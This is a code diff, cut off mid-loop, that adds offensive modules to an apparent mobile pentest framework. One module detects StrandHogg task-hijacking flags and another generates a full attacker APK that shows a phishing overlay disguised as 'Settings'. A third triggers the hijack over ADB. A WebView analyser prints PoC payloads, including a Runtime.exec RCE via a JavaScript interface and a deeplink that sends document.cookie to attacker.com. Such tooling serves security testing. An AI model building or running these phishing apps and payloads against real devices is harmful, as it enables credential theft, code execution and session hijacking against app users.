@@ -441,6 +441,18 @@ class MassiveMobileSecurityFramework:
             back()
             return 2
 
+    def bypass_ssl_frida_v2(self, proxy_host, proxy_port, cert_pem):
+        """Delegates to the httptoolkit multi-script SSL bypass stack."""
+        if not self._frida.config.get("app"):
+            print(Fore.RED + "[-] Set APP first!" + Fore.RESET)
+            return 0
+        import threading
+        threading.Thread(
+            target=self._frida.bypass_ssl_v2,
+            args=(proxy_host, proxy_port, cert_pem)
+        ).start()
+        return 1
+
     # Bypass SSL Network Config
     def bypass_network_config(self, cmd, data):
         self._apktool.config["path"] = data["path"]
@@ -1821,6 +1833,1161 @@ adb shell am start -n {attacker}/.StrandHogg2Launcher
                 {"name": "LOOT_PATH",        "value": data.get("loot_path", ""),            "description": "Output directory", "required": False},
             ])
             return 0
+        elif cmd == "exit":
+            quit_app()
+        elif cmd == "back":
+            back()
+            return 2
+    
+    # ─────────────────────────────────────────────────────────────────────────────
+# TASK HIJACKING (StrandHogg) methods
+# ─────────────────────────────────────────────────────────────────────────────
+
+    def taskhijacking_detect(self, cmd, data):
+        """
+        Parse a decoded AndroidManifest.xml for the StrandHogg 1.0 triplet:
+          - launchMode="singleTask"      on any <activity>
+          - taskAffinity=""              on that same <activity>
+          - allowTaskReparenting="true"  on <application>
+        Also flags targetSdkVersion <= 28 (required for the attack to work).
+        """
+        if cmd == "run":
+            manifest = data.get("manifest_path", "")
+            if not manifest:
+                print(Fore.RED + "[-] Set MANIFEST_PATH first!" + Fore.RESET)
+                return 0
+            if not os.path.isfile(manifest):
+                print(Fore.RED + f"[-] File not found: {manifest}" + Fore.RESET)
+                return 0
+
+            print(Fore.YELLOW + f"[*] Analysing {manifest}" + Fore.RESET)
+            content = open(manifest).read()
+
+            findings = []
+
+            # allowTaskReparenting on <application>
+            if re.search(r'allowTaskReparenting\s*=\s*"true"', content):
+                findings.append(("CRITICAL", "allowTaskReparenting=\"true\" found on <application>"))
+
+            # singleTask + taskAffinity on any activity
+            activities = re.findall(r'<activity[\s\S]*?(?:</activity>|/>)', content)
+            for act in activities:
+                name_m = re.search(r'android:name\s*=\s*"([^"]+)"', act)
+                aname  = name_m.group(1) if name_m else "(unknown)"
+                has_single = re.search(r'launchMode\s*=\s*"singleTask"', act)
+                has_affinity = re.search(r'taskAffinity\s*=\s*""', act)
+                if has_single:
+                    findings.append(("HIGH", f"launchMode=singleTask on activity: {aname}"))
+                if has_affinity:
+                    findings.append(("HIGH", f"taskAffinity=\"\" (empty) on activity: {aname}"))
+                if has_single and has_affinity:
+                    findings.append(("CRITICAL", f"STRANDHOGG CANDIDATE: {aname} — singleTask + empty taskAffinity"))
+
+            # targetSdkVersion
+            sdk_m = re.search(r'targetSdkVersion\s*=\s*"(\d+)"', content)
+            if sdk_m:
+                sdk = int(sdk_m.group(1))
+                if sdk <= 28:
+                    findings.append(("HIGH", f"targetSdkVersion={sdk} (≤28) — task hijacking NOT mitigated by platform"))
+                else:
+                    findings.append(("INFO", f"targetSdkVersion={sdk} (≥29) — platform partially mitigates StrandHogg 1.0"))
+
+            if not findings:
+                print(Fore.GREEN + "[+] No task hijacking indicators found." + Fore.RESET)
+            else:
+                print(Fore.CYAN + "\n[Task Hijacking Scan Results]" + Fore.RESET)
+                for severity, msg in findings:
+                    colour = Fore.RED if severity == "CRITICAL" else Fore.YELLOW if severity == "HIGH" else Fore.BLUE
+                    print(colour + f"  [{severity}] {msg}" + Fore.RESET)
+            return 1
+
+        elif cmd == "show":
+            print_show_table([
+                {"name": "MANIFEST_PATH", "value": data.get("manifest_path", ""),
+                 "description": "Absolute path to the decoded AndroidManifest.xml (apktool output)"}])
+            return 0
+        elif cmd == "exit":
+            quit_app()
+        elif cmd == "back":
+            back()
+            return 2
+
+    def taskhijacking_generate(self, cmd, data):
+        """
+        Scaffold an attacker APK source directory.
+        The generated project has:
+          - taskAffinity = <target_package>  (same as victim → reparenting)
+          - launchMode   = singleTask
+          - allowTaskReparenting = true
+        Build with: ./gradlew assembleDebug  →  sign  →  adb install
+        """
+        if cmd == "run":
+            pkg = data.get("target_package", "")
+            if not pkg:
+                print(Fore.RED + "[-] Set TARGET_PACKAGE first!" + Fore.RESET)
+                return 0
+
+            act      = data.get("target_activity", ".MainActivity")
+            txt      = data.get("phishing_text", "Session expired. Please login again.")
+            out_dir  = data.get("out_dir", os.path.expanduser("~/.mmsf/loot/taskhijacking/"))
+            att_pkg  = "com.mmsf.attacker"
+            proj_dir = os.path.join(out_dir, "attacker_apk")
+
+            os.makedirs(os.path.join(proj_dir, "app/src/main/java/com/mmsf/attacker"), exist_ok=True)
+            os.makedirs(os.path.join(proj_dir, "app/src/main/res/layout"), exist_ok=True)
+            os.makedirs(os.path.join(proj_dir, "app/src/main/res/values"), exist_ok=True)
+
+            # AndroidManifest.xml — the vulnerable triplet lives HERE in the attacker app
+            manifest = f"""<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="{att_pkg}">
+
+    <application
+        android:allowBackup="true"
+        android:allowTaskReparenting="true"
+        android:label="@string/app_name">
+
+        <activity
+            android:name=".PhishActivity"
+            android:taskAffinity="{pkg}"
+            android:launchMode="singleTask"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+    </application>
+</manifest>
+"""
+            # PhishActivity.java
+            java = f"""package com.mmsf.attacker;
+
+import android.app.Activity;
+import android.os.Bundle;
+import android.widget.TextView;
+import android.widget.LinearLayout;
+import android.view.Gravity;
+import android.graphics.Color;
+
+public class PhishActivity extends Activity {{
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {{
+        super.onCreate(savedInstanceState);
+
+        // Mimic victim package colours / branding at runtime
+        LinearLayout layout = new LinearLayout(this);
+        layout.setOrientation(LinearLayout.VERTICAL);
+        layout.setGravity(Gravity.CENTER);
+        layout.setBackgroundColor(Color.WHITE);
+
+        TextView tv = new TextView(this);
+        tv.setText("{txt}");
+        tv.setTextSize(20f);
+        tv.setTextColor(Color.BLACK);
+        tv.setGravity(Gravity.CENTER);
+        tv.setPadding(48, 48, 48, 48);
+
+        layout.addView(tv);
+        setContentView(layout);
+    }}
+}}
+"""
+            # build.gradle (app)
+            build_app = """apply plugin: 'com.android.application'
+
+android {
+    compileSdkVersion 28
+    defaultConfig {
+        applicationId "com.mmsf.attacker"
+        minSdkVersion 21
+        targetSdkVersion 28
+        versionCode 1
+        versionName "1.0"
+    }
+    buildTypes {
+        release { minifyEnabled false }
+    }
+}
+dependencies {
+    implementation 'androidx.appcompat:appcompat:1.2.0'
+}
+"""
+            # root build.gradle
+            build_root = """buildscript {
+    repositories { google(); mavenCentral() }
+    dependencies { classpath 'com.android.tools.build:gradle:4.2.2' }
+}
+allprojects { repositories { google(); mavenCentral() } }
+"""
+            # settings.gradle
+            settings = """include ':app'
+rootProject.name = "MmsfAttacker"
+"""
+            # strings.xml
+            strings = """<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Settings</string>
+</resources>
+"""
+            # Write all files
+            def write(path, content):
+                with open(path, "w") as f:
+                    f.write(content)
+
+            write(os.path.join(proj_dir, "app/src/main/AndroidManifest.xml"), manifest)
+            write(os.path.join(proj_dir, "app/src/main/java/com/mmsf/attacker/PhishActivity.java"), java)
+            write(os.path.join(proj_dir, "app/build.gradle"), build_app)
+            write(os.path.join(proj_dir, "build.gradle"), build_root)
+            write(os.path.join(proj_dir, "settings.gradle"), settings)
+            write(os.path.join(proj_dir, "app/src/main/res/values/strings.xml"), strings)
+
+            print(Fore.GREEN + f"\n[+] Attacker project written to: {proj_dir}" + Fore.RESET)
+            print(Fore.YELLOW + f"[*] Target package  : {pkg}" + Fore.RESET)
+            print(Fore.YELLOW + f"[*] Phishing text   : {txt}" + Fore.RESET)
+            print(Fore.CYAN   + "\n[*] Build steps:" + Fore.RESET)
+            print(Fore.WHITE  + f"    cd {proj_dir}" + Fore.RESET)
+            print(Fore.WHITE  + "    ./gradlew assembleDebug" + Fore.RESET)
+            print(Fore.WHITE  + "    adb install app/build/outputs/apk/debug/app-debug.apk" + Fore.RESET)
+            print(Fore.CYAN   + "\n[*] Then trigger with:" + Fore.RESET)
+            print(Fore.WHITE  + f"    adb shell am start -n {pkg}/{act}" + Fore.RESET)
+            print(Fore.WHITE  + "    # Press Home → reopen victim app → attacker overlay appears" + Fore.RESET)
+            return 1
+
+        elif cmd == "show":
+            print_show_table([
+                {"name": "TARGET_PACKAGE",   "value": data.get("target_package", ""),   "description": "Victim package: e.g. com.mmsf.taskhijackingvictim"},
+                {"name": "TARGET_ACTIVITY",  "value": data.get("target_activity", ""),  "description": "Victim main activity: e.g. .MainActivity", "required": False},
+                {"name": "PHISHING_TEXT",    "value": data.get("phishing_text", ""),    "description": "Text shown in the overlay screen", "required": False},
+                {"name": "OUT_DIR",          "value": data.get("out_dir", ""),          "description": "Output directory for the generated project", "required": False}])
+            return 0
+        elif cmd == "exit":
+            quit_app()
+        elif cmd == "back":
+            back()
+            return 2
+
+    def taskhijacking_trigger(self, cmd, data):
+        """
+        Trigger the StrandHogg attack live via ADB:
+          1. Launch victim to prime its task stack
+          2. Press HOME (keyevent 3) to background it
+          3. Launch attacker — it reparents into the victim's task
+        """
+        if cmd == "run":
+            pkg = data.get("target_package", "")
+            act = data.get("target_activity", ".MainActivity")
+            att = data.get("attacker_package", "com.mmsf.attacker")
+            if not pkg:
+                print(Fore.RED + "[-] Set TARGET_PACKAGE first!" + Fore.RESET)
+                return 0
+
+            adb = Constants.ADB.value
+
+            def _trigger():
+                print(Fore.YELLOW + "[*] Step 1: Launch victim app..." + Fore.RESET)
+                subprocess.run(f"{adb} shell am start -n {pkg}/{act}".split(),
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                import time; time.sleep(2)
+
+                print(Fore.YELLOW + "[*] Step 2: Press HOME to background victim..." + Fore.RESET)
+                subprocess.run(f"{adb} shell input keyevent 3".split(),
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                time.sleep(1)
+
+                print(Fore.YELLOW + "[*] Step 3: Launch attacker — hijacking victim task..." + Fore.RESET)
+                subprocess.run(f"{adb} shell monkey -p {att} -c android.intent.category.LAUNCHER 1".split(),
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                time.sleep(2)
+
+                print(Fore.YELLOW + "[*] Step 4: Press recents, tap victim — overlay should appear..." + Fore.RESET)
+                subprocess.run(f"{adb} shell am start -n {pkg}/{act}".split(),
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+                print(Fore.GREEN + "[+] Trigger sequence complete. Check device screen." + Fore.RESET)
+
+            threading.Thread(target=_trigger, args=([])).start()
+            return 1
+
+        elif cmd == "show":
+            print_show_table([
+                {"name": "TARGET_PACKAGE",   "value": data.get("target_package", ""),   "description": "Victim app package: com.mmsf.taskhijackingvictim"},
+                {"name": "TARGET_ACTIVITY",  "value": data.get("target_activity", ""),  "description": "Victim main activity: .MainActivity", "required": False},
+                {"name": "ATTACKER_PACKAGE", "value": data.get("attacker_package", ""), "description": "Attacker package installed on device. Default: com.mmsf.attacker", "required": False}])
+            return 0
+        elif cmd == "exit":
+            quit_app()
+        elif cmd == "back":
+            back()
+            return 2
+
+# ─────────────────────────────────────────────────────────────────────────────
+# WEBVIEW methods
+# ─────────────────────────────────────────────────────────────────────────────
+
+# ─── Drop-in replacement for webview_detect() in MassiveMobileSecurityFramework ───
+
+    def webview_detect(self, cmd, data):
+        """
+        Deep WebView exploitability analysis.
+
+        Per-class inspection:
+          • Which WebSettings flags are set (and to what value)
+          • Whether loadUrl / loadData / loadDataWithBaseURL is called
+          • Whether the URL source is user-controlled (intent / deeplink)
+          • Whether addJavascriptInterface is present and what interface names
+          • Whether shouldOverrideUrlLoading is missing or returns false (open-redirect)
+          • Whether onReceivedSslError calls handler.proceed() (cert bypass)
+          • Whether DOM Storage / mixed content / universal file access is on
+
+        Manifest correlation:
+          • Map class → Activity name
+          • Check exported=true / intent-filter with <data> scheme
+          • targetSdkVersion (< 29 → StrandHogg, < 17 → JS-interface RCE)
+
+        Exploit chain synthesis:
+          Chain A  JS-interface RCE   exported + JS + addJavascriptInterface + user URL
+          Chain B  File exfiltration  exported + universalFileAccess + JS + user URL
+          Chain C  Open redirect      exported + no shouldOverrideUrlLoading + user URL
+          Chain D  SSL MITM           exported + onReceivedSslError.proceed()
+          Chain E  XSS via deeplink   exported + JS + user-controlled URL (no interface)
+        """
+        import glob, xml.etree.ElementTree as ET
+
+        if cmd == "run":
+            apk_path     = data.get("apk_path", "")
+            decoded_path = data.get("decoded_path", "")
+
+            if not apk_path and not decoded_path:
+                print(Fore.RED + "[-] Set APK_PATH or DECODED_PATH first!" + Fore.RESET)
+                return 0
+
+            # ── Decode APK if needed ──────────────────────────────────────────
+            if apk_path and not decoded_path:
+                decoded_path = apk_path.replace(".apk", "_decoded")
+                if not os.path.isdir(decoded_path):
+                    print(Fore.YELLOW + f"[*] Decoding APK → {decoded_path} ..." + Fore.RESET)
+                    r = subprocess.run(
+                        ["apktool", "d", "-f", apk_path, "-o", decoded_path],
+                        stdout=subprocess.PIPE, stderr=subprocess.PIPE
+                    )
+                    if r.returncode != 0:
+                        print(Fore.RED + "[-] apktool decode failed:\n" + r.stderr.decode() + Fore.RESET)
+                        return 0
+                else:
+                    print(Fore.YELLOW + f"[*] Reusing existing decoded dir: {decoded_path}" + Fore.RESET)
+
+            print(Fore.CYAN + "\n" + "="*72 + Fore.RESET)
+            print(Fore.GREEN + "  MMSF  WebView Deep Exploitability Analysis" + Fore.RESET)
+            print(Fore.CYAN + "="*72 + "\n" + Fore.RESET)
+
+            # ── 1. Parse AndroidManifest ──────────────────────────────────────
+            manifest_path = os.path.join(decoded_path, "AndroidManifest.xml")
+            exported_activities  = set()   # package-qualified activity names
+            deeplink_activities  = set()   # activities with <data> scheme in intent-filter
+            target_sdk           = None
+            app_package          = ""
+            reparenting_on       = False
+
+            if os.path.isfile(manifest_path):
+                try:
+                    tree = ET.parse(manifest_path)
+                    root = tree.getroot()
+                    ns   = "http://schemas.android.com/apk/res/android"
+                    app_package = root.get("package", "")
+
+                    sdk_el = root.find(".//uses-sdk")
+                    if sdk_el is not None:
+                        ts = sdk_el.get(f"{{{ns}}}targetSdkVersion")
+                        if ts:
+                            target_sdk = int(ts)
+
+                    app_el = root.find("application")
+                    if app_el is not None:
+                        rtr = app_el.get(f"{{{ns}}}allowTaskReparenting", "false")
+                        reparenting_on = rtr.lower() == "true"
+
+                    for act in root.findall(".//activity"):
+                        raw_name  = act.get(f"{{{ns}}}name", "")
+                        exp_val   = act.get(f"{{{ns}}}exported", "")
+                        # Normalise name to fully-qualified
+                        if raw_name.startswith("."):
+                            full_name = app_package + raw_name
+                        elif "." not in raw_name:
+                            full_name = app_package + "." + raw_name
+                        else:
+                            full_name = raw_name
+
+                        has_filter = act.find("intent-filter") is not None
+
+                        # exported is implied true when intent-filter exists (pre-API31 default)
+                        if exp_val.lower() == "true" or (has_filter and exp_val == ""):
+                            exported_activities.add(full_name)
+
+                        # Check for deeplink <data> scheme
+                        for ifilter in act.findall("intent-filter"):
+                            for delem in ifilter.findall("data"):
+                                scheme = delem.get(f"{{{ns}}}scheme", "")
+                                if scheme:
+                                    deeplink_activities.add(full_name)
+                                    exported_activities.add(full_name)
+                except Exception as ex:
+                    print(Fore.YELLOW + f"[!] Manifest parse warning: {ex}" + Fore.RESET)
+            else:
+                print(Fore.YELLOW + "[!] AndroidManifest.xml not found — skipping manifest correlation" + Fore.RESET)
+
+            # ── 2. Per-class smali analysis ───────────────────────────────────
+            #
+            # Data model per class:
+            #   class_findings[smali_path] = {
+            #       "class":           str,   # Landroid/...; style
+            #       "js_enabled":      bool,
+            #       "js_disabled":     bool,
+            #       "file_access":     bool,
+            #       "univ_file":       bool,
+            #       "file_from_file":  bool,
+            #       "mixed_content":   bool,
+            #       "dom_storage":     bool,
+            #       "add_js_iface":    list[str],   # interface names
+            #       "load_url":        bool,
+            #       "load_data":       bool,
+            #       "url_from_intent": bool,   # getStringExtra / getData() near loadUrl
+            #       "no_override_url": bool,   # extends WebViewClient but no shouldOverrideUrlLoading
+            #       "ssl_proceed":     bool,   # onReceivedSslError calls proceed()
+            #       "is_webviewclient":bool,
+            #       "is_activity":     bool,
+            #       "activity_fqn":    str,    # fully-qualified Java class name
+            #   }
+
+            class_data = {}
+
+            smali_files = glob.glob(
+                os.path.join(decoded_path, "**/*.smali"), recursive=True
+            )
+
+            for smali_path in smali_files:
+                try:
+                    raw = open(smali_path, errors="ignore").read()
+                except Exception:
+                    continue
+
+                # Class name from .class directive
+                cm = re.search(r'^\.class\s+.*?(L[^\s;]+;)', raw, re.M)
+                if not cm:
+                    continue
+                smali_class = cm.group(1)                          # e.g. Lcom/example/MainActivity;
+                java_class  = smali_class[1:].replace("/", ".").rstrip(";")
+                fname       = os.path.basename(smali_path)
+
+                d = {
+                    "class":           java_class,
+                    "fname":           fname,
+                    "js_enabled":      False,
+                    "js_disabled":     False,
+                    "file_access":     False,
+                    "univ_file":       False,
+                    "file_from_file":  False,
+                    "mixed_content":   False,
+                    "dom_storage":     False,
+                    "add_js_iface":    [],
+                    "load_url":        False,
+                    "load_data":       False,
+                    "url_from_intent": False,
+                    "no_override_url": False,
+                    "ssl_proceed":     False,
+                    "is_webviewclient":False,
+                    "is_activity":     False,
+                    "activity_fqn":    "",
+                }
+
+                # Superclass
+                super_m = re.search(r'^\.super\s+(L[^\s;]+;)', raw, re.M)
+                if super_m:
+                    sup = super_m.group(1)
+                    if "Activity" in sup or "Fragment" in sup:
+                        d["is_activity"] = True
+                        d["activity_fqn"] = java_class
+                    if "WebViewClient" in sup:
+                        d["is_webviewclient"] = True
+
+                # WebSettings flags —
+                #   smali calls look like:
+                #   invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
+                #   const/4 v1, 0x1   (true) or 0x0 (false)
+                #   We look at the const just before the invoke.
+                def flag_value(method_name):
+                    """Return True/False/None based on boolean arg to a WebSettings setter."""
+                    pat = re.compile(
+                        r'((?:const(?:/4|/16|))\s+\S+,\s+(0x[01]))\s*\n'
+                        r'(?:.*\n){0,3}'
+                        r'.*invoke-virtual.*WebSettings;->' + re.escape(method_name),
+                        re.M
+                    )
+                    m = pat.search(raw)
+                    if m:
+                        return m.group(2) == "0x1"
+                    # Fallback: just presence
+                    if re.search(r'WebSettings;->' + re.escape(method_name), raw):
+                        return True          # assume true if we can't determine value
+                    return None
+
+                js_val = flag_value("setJavaScriptEnabled(Z)V")
+                if js_val is True:
+                    d["js_enabled"] = True
+                elif js_val is False:
+                    d["js_disabled"] = True
+
+                if flag_value("setAllowFileAccess(Z)V") is True:
+                    d["file_access"] = True
+                if flag_value("setAllowUniversalAccessFromFileURLs(Z)V") is True:
+                    d["univ_file"] = True
+                if flag_value("setAllowFileAccessFromFileURLs(Z)V") is True:
+                    d["file_from_file"] = True
+                if flag_value("setDomStorageEnabled(Z)V") is True:
+                    d["dom_storage"] = True
+                if flag_value("setMixedContentMode(I)V") is not None:
+                    # 0 = MIXED_CONTENT_ALWAYS_ALLOW
+                    mc_pat = re.compile(
+                        r'const(?:/4|/16|)\s+\S+,\s+(0x0)\s*\n'
+                        r'(?:.*\n){0,3}'
+                        r'.*WebSettings;->setMixedContentMode', re.M)
+                    if mc_pat.search(raw):
+                        d["mixed_content"] = True
+
+                # addJavascriptInterface  — grab the string constant (interface name)
+                for m in re.finditer(
+                    r'const-string\s+\S+,\s+"([^"]+)"\s*\n'
+                    r'(?:.*\n){0,4}'
+                    r'.*WebView;->addJavascriptInterface',
+                    raw, re.M
+                ):
+                    d["add_js_iface"].append(m.group(1))
+                # Fallback: just detect presence
+                if not d["add_js_iface"] and "WebView;->addJavascriptInterface" in raw:
+                    d["add_js_iface"].append("(name unknown)")
+
+                # loadUrl / loadData
+                if "WebView;->loadUrl(" in raw:
+                    d["load_url"] = True
+                if re.search(r'WebView;->loadData\b|WebView;->loadDataWithBaseURL', raw):
+                    d["load_data"] = True
+
+                # User-controlled URL: getIntent / getStringExtra / getData near loadUrl
+                if d["load_url"] or d["load_data"]:
+                    if re.search(r'getIntent\(\)|getStringExtra|getDataString\(\)|getData\(\)', raw):
+                        d["url_from_intent"] = True
+
+                # shouldOverrideUrlLoading — only relevant in WebViewClient subclasses
+                if d["is_webviewclient"]:
+                    if "shouldOverrideUrlLoading" not in raw:
+                        d["no_override_url"] = True
+
+                # onReceivedSslError — does it call proceed()?
+                ssl_m = re.search(
+                    r'onReceivedSslError[\s\S]{0,500}SslErrorHandler;->proceed\(\)', raw
+                )
+                if ssl_m:
+                    d["ssl_proceed"] = True
+
+                # Only store if something WebView-related was found
+                interesting = (
+                    d["js_enabled"] or d["univ_file"] or d["file_from_file"]
+                    or d["add_js_iface"] or d["load_url"] or d["load_data"]
+                    or d["ssl_proceed"] or d["no_override_url"] or d["mixed_content"]
+                )
+                if interesting:
+                    class_data[smali_path] = d
+
+            if not class_data:
+                print(Fore.GREEN + "[+] No WebView usage found in smali." + Fore.RESET)
+                return 1
+
+            # ── 3. Manifest-level summary ─────────────────────────────────────
+            print(Fore.CYAN + "── Manifest Summary " + "─"*52 + Fore.RESET)
+            sdk_str = str(target_sdk) if target_sdk else "unknown"
+            sdk_warn = ""
+            if target_sdk and target_sdk < 17:
+                sdk_warn = Fore.RED + "  ⚠ <17: addJavascriptInterface is FULLY RCE (no @JavascriptInterface needed)" + Fore.RESET
+            elif target_sdk and target_sdk < 29:
+                sdk_warn = Fore.YELLOW + "  ⚠ <29: Task hijacking (StrandHogg) not mitigated" + Fore.RESET
+            print(f"  Package         : {Fore.WHITE}{app_package or '(unknown)'}{Fore.RESET}")
+            print(f"  targetSdkVersion: {Fore.WHITE}{sdk_str}{Fore.RESET}{sdk_warn}")
+            print(f"  Exported acts   : {Fore.WHITE}{len(exported_activities)}{Fore.RESET}  → {', '.join(list(exported_activities)[:4]) or 'none'}")
+            print(f"  Deeplink acts   : {Fore.WHITE}{len(deeplink_activities)}{Fore.RESET}  → {', '.join(list(deeplink_activities)[:4]) or 'none'}")
+            if reparenting_on:
+                print(Fore.RED + "  allowTaskReparenting=true  ← StrandHogg candidate" + Fore.RESET)
+            print()
+
+            # ── 4. Per-class findings ─────────────────────────────────────────
+            print(Fore.CYAN + "── Per-Class WebView Findings " + "─"*42 + Fore.RESET)
+            for spath, d in sorted(class_data.items(), key=lambda x: x[1]["fname"]):
+                flags   = []
+                if d["js_enabled"]:           flags.append(("HIGH",     "JS=ON"))
+                if d["univ_file"]:            flags.append(("CRITICAL", "UniversalFileAccess=ON"))
+                if d["file_from_file"]:       flags.append(("HIGH",     "FileAccessFromFileURLs=ON"))
+                if d["file_access"]:          flags.append(("MEDIUM",   "FileAccess=ON"))
+                if d["mixed_content"]:        flags.append(("HIGH",     "MixedContent=ALWAYS_ALLOW"))
+                if d["dom_storage"]:          flags.append(("LOW",      "DomStorage=ON"))
+                if d["add_js_iface"]:
+                    for iface in d["add_js_iface"]:
+                        flags.append(("CRITICAL", f"addJavascriptInterface('{iface}')"))
+                if d["load_url"]:             flags.append(("INFO",     "loadUrl() present"))
+                if d["url_from_intent"]:      flags.append(("HIGH",     "URL from Intent/Deeplink"))
+                if d["no_override_url"]:      flags.append(("HIGH",     "shouldOverrideUrlLoading ABSENT"))
+                if d["ssl_proceed"]:          flags.append(("CRITICAL", "onReceivedSslError→proceed() — cert bypass"))
+
+                if not flags:
+                    continue
+
+                print(f"\n  {Fore.WHITE}Class:{Fore.RESET} {d['fname']}  ({d['class']})")
+                for sev, msg in flags:
+                    c = Fore.RED if sev == "CRITICAL" else Fore.YELLOW if sev == "HIGH" else Fore.BLUE if sev == "MEDIUM" else Fore.WHITE
+                    print(f"    {c}[{sev}]{Fore.RESET} {msg}")
+            print()
+
+            # ── 5. Exploit chain synthesis ────────────────────────────────────
+            print(Fore.CYAN + "── Exploit Chain Analysis " + "─"*46 + Fore.RESET)
+            chains_found = []
+
+            for spath, d in class_data.items():
+                cls   = d["class"]
+                fname = d["fname"]
+
+                # Map class to exported/deeplink activity
+                # Simple heuristic: the class itself or its outer class is in exported_activities
+                cls_exported  = any(e.endswith(cls.split(".")[-1]) or cls.endswith(e.split(".")[-1])
+                                    for e in exported_activities)
+                cls_deeplink  = any(e.endswith(cls.split(".")[-1]) or cls.endswith(e.split(".")[-1])
+                                    for e in deeplink_activities)
+                reachable     = cls_exported or cls_deeplink or d["url_from_intent"]
+                reachable_str = (
+                    Fore.GREEN + "✔ reachable via exported activity" + Fore.RESET if cls_exported
+                    else Fore.GREEN + "✔ reachable via deeplink" + Fore.RESET if cls_deeplink
+                    else Fore.YELLOW + "⚠ reachability unclear (not in manifest exports)" + Fore.RESET
+                )
+
+                # Chain A: JS-interface → RCE
+                if d["js_enabled"] and d["add_js_iface"]:
+                    ifaces = ", ".join(d["add_js_iface"])
+                    severity = "EXPLOITABLE" if reachable else "LIKELY_EXPLOITABLE"
+                    chains_found.append({
+                        "id":       "A",
+                        "severity": severity,
+                        "title":    "JavaScript Interface → RCE",
+                        "class":    fname,
+                        "reach":    reachable_str,
+                        "chain": [
+                            f"JS enabled (setJavaScriptEnabled=true)",
+                            f"Interface(s) exposed: {ifaces}",
+                            "Attacker-controlled URL loads JS that calls interface methods",
+                            "→ arbitrary Java code execution in app context",
+                        ],
+                        "poc": f"adb shell am start -n {app_package}/.WebViewActivity \\\n"
+                               f"          --es url \"javascript:{d['add_js_iface'][0]}.getClass().forName('java.lang.Runtime').getMethod('exec',String.class).invoke(null,'id')\"",
+                        "requires_user_url": d["url_from_intent"],
+                    })
+
+                # Chain B: Universal file access + JS → exfil
+                if d["js_enabled"] and d["univ_file"]:
+                    severity = "EXPLOITABLE" if reachable else "LIKELY_EXPLOITABLE"
+                    chains_found.append({
+                        "id":       "B",
+                        "severity": severity,
+                        "title":    "Universal File Access → arbitrary file read",
+                        "class":    fname,
+                        "reach":    reachable_str,
+                        "chain": [
+                            "JS enabled",
+                            "setAllowUniversalAccessFromFileURLs=true  (SOP disabled)",
+                            "Open file:///data/data/<pkg>/... via file:// URL",
+                            "JS XHR reads any app-private file → exfil via img.src",
+                        ],
+                        "poc": f"# Push probe HTML, open in app:\n"
+                               f"adb shell am start -n {app_package}/.WebViewActivity \\\n"
+                               f"          --es url \"file:///sdcard/probe.html\"",
+                        "requires_user_url": d["url_from_intent"],
+                    })
+
+                # Chain C: Open redirect / URL scheme confusion
+                if d["load_url"] and d["url_from_intent"] and d.get("no_override_url", False):
+                    severity = "EXPLOITABLE" if reachable else "LIKELY_EXPLOITABLE"
+                    chains_found.append({
+                        "id":       "C",
+                        "severity": severity,
+                        "title":    "Open Redirect / URL-scheme confusion",
+                        "class":    fname,
+                        "reach":    reachable_str,
+                        "chain": [
+                            "loadUrl receives URL directly from Intent",
+                            "No shouldOverrideUrlLoading → all schemes forwarded to WebView",
+                            "→ javascript: scheme executes attacker JS; intent: can launch arbitrary components",
+                        ],
+                        "poc": f"adb shell am start -n {app_package}/.WebViewActivity \\\n"
+                               f"          --es url \"javascript:alert(document.cookie)\"",
+                        "requires_user_url": True,
+                    })
+
+                # Chain D: SSL MITM
+                if d["ssl_proceed"]:
+                    severity = "EXPLOITABLE" if reachable else "LIKELY_EXPLOITABLE"
+                    chains_found.append({
+                        "id":       "D",
+                        "severity": severity,
+                        "title":    "SSL Certificate bypass → MITM",
+                        "class":    fname,
+                        "reach":    reachable_str,
+                        "chain": [
+                            "onReceivedSslError calls handler.proceed() unconditionally",
+                            "Any certificate (self-signed, expired, wrong host) is accepted",
+                            "→ intercept HTTPS with Burp / mitmproxy without extra config",
+                        ],
+                        "poc": "# No APK modification needed; set device proxy to Burp and intercept",
+                        "requires_user_url": False,
+                    })
+
+                # Chain E: XSS via deeplink (JS on, no interface, but user-controlled URL)
+                if d["js_enabled"] and d["url_from_intent"] and not d["add_js_iface"]:
+                    severity = "EXPLOITABLE" if reachable else "LIKELY_EXPLOITABLE"
+                    chains_found.append({
+                        "id":       "E",
+                        "severity": severity,
+                        "title":    "Stored/Reflected XSS via deeplink URL",
+                        "class":    fname,
+                        "reach":    reachable_str,
+                        "chain": [
+                            "JS enabled",
+                            "URL sourced from Intent extra / deeplink parameter",
+                            "No addJavascriptInterface → limited to DOM/cookie theft",
+                            "→ steal session cookies / auth tokens rendered in WebView",
+                        ],
+                        "poc": f"adb shell am start -a android.intent.action.VIEW \\\n"
+                               f"          -d \"myapp://open?url=javascript:document.location='http://attacker.com/?c='+document.cookie\" \\\n"
+                               f"          {app_package}",
+                        "requires_user_url": True,
+                    })
+
+            if not chains_found:
+                print(Fore.GREEN + "\n[+] No actionable exploit chains identified." + Fore.RESET)
+                print(Fore.YELLOW + "    Flags were found but either the activity is not exported or\n"
+                      "    the URL is not user-controlled — exploitation requires additional context." + Fore.RESET)
+            else:
+                for ch in chains_found:
+                    colour = Fore.RED if ch["severity"] == "EXPLOITABLE" else Fore.YELLOW
+                    print(f"\n  {colour}[{ch['severity']}]{Fore.RESET}  Chain {ch['id']}: {Fore.WHITE}{ch['title']}{Fore.RESET}")
+                    print(f"  Class    : {ch['class']}")
+                    print(f"  Reach    : {ch['reach']}")
+                    print(f"  Requires user-controlled URL: {'YES' if ch['requires_user_url'] else 'NO (passive)'}")
+                    print(f"  {Fore.CYAN}Attack chain:{Fore.RESET}")
+                    for step in ch["chain"]:
+                        print(f"    → {step}")
+                    print(f"  {Fore.CYAN}PoC:{Fore.RESET}")
+                    for line in ch["poc"].splitlines():
